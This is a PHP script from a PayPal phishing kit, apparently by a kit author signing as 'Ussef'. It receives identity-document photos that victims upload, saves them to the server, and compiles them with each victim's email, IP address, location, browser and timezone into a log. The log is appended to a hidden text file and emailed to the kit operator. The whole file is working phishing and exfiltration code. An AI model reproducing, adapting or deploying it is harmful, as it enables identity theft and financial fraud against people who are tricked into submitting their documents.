<?php if (isset($_POST['doc_type']) && isset($_POST['images'])) {
    session_start();
    include '../mine.php';
    function upImg($vl) {
        $t = microtime(true);
        $micro = sprintf("%06d", ($t - floor($t)) * 1000000);
        $today = date("m.d.y.h.i.s.U" . $micro, $t);
        $name = hash('md5', $today);
        $type = explode(';', $vl) [0];
        $type = '.' . explode('/', $type) [1];
        $base = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . './../../../proof/';
        file_put_contents('./../../proof/' . $name . $type, base64_decode(explode(',', $vl) [1]));
        return $base . $name . $type;
    }
    $_SESSION['doc_type'] = $_POST['doc_type'];
    $msg = "=========== <[ Ussef PaYPal IdeNtiTy ]> ===========
";
    $msg.= "ID OF USER	: {$_SESSION['EML']}
";
    $msg.= "TYPE		: {$_POST['doc_type']}
";
    for ($i = 0;$i < count($_POST['images']);$i++) {
        $msg.= "FACE (" . (int)($i + 1) . ")	: " . upImg($_POST['images'][$i]) . "
";
    }
    $msg.= "---------------------- IP Info ----------------------
";
    $msg.= "IP ADDRESS	: {$_SESSION['ip']}
";
    $msg.= "LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}
";
    $msg.= "BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}
";
    $msg.= "TIMEZONE	: {$_SESSION['ip_timezone']}
";
    $msg.= "TIME		: " . now() . " GMT
";
    $msg.= "=========== <[ Ussef PaYPal IdeNtiTy ]> ===========


";
    $save = fopen("../../hahaha883.txt", "a+");
    fwrite($save, $msg);
    fclose($save);
    $subject = "PaYPal IdeNtiTy [" . $_POST['doc_type'] . "|" . $_SESSION['ip_countryName'] . "]";
    $headers = "From:Ussef <ussef@sudospeak.com>
";
    $headers.= "MIME-Version: 1.0
";
    $headers.= "Content-Type: text/plain; charset=UTF-8
";
    @mail($yours, $subject, $msg, $headers);
    exit('done');
} ?>